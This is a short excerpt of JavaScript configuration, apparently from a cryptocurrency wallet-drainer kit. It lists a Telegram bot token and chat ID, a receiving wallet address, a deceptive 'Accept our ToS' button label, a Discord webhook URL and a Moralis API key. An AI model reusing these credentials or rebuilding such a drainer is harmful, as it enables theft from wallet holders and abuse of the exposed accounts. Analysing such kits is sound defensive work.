...
const BOT_TOKEN = "5409320207:AAG6ZbHZZ20OPnSCABf3-J9CCtVRCX2LgCg";
const CHAT_ID = "710327836";
...
const config = { 
   ...
   receiver: "0x51fdA684F1398AC50CAE353f4B3224E8f60c5AFe",
   ...
   design: {
       ...
       buttonMessages: {
         ...
         initialConnected: "Accept our ToS",
   ...
   webhookURL: "https://discord.com/api/webhooks/992527757152096296/xR45sBBxePU6vOeNtyq8APKOyovMzg02u87E7t-xhT2ouPuv5TJFofJbzdEze6WGAofe",
...
class Configuration {
    ...
    MoralisAPI = "RZS3yyBxozFkTpWMCDiGyYctKo9PCYYIUGsA0JvvZNaQYpohhGXFQITY2aPZNP9T";
    requestOptions = {
        method: 'GET',
        headers: {
